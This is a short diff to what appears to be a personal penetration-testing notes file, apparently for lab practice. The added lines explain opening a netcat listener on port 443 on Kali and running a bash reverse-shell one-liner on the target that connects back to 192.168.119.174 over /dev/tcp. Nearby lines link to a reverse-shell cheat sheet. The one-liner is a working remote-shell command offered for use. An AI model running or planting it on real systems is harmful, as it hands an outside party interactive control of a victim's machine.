@@ -206,5 +206,9 @@ axel -a -n 20 -o report.pdf https://...
  # reverse shell cheet sheet
  https://www.hacknos.com/reverse-shell-cheat-sheet/
 
+ # starting interactive shell
+ * first open port 443 with NC on kali
+ * run on client: `/bin/bash -i >& /dev/tcp/192.168.119.174/443 0>&1` to open interactive bash on client.
+
 
 
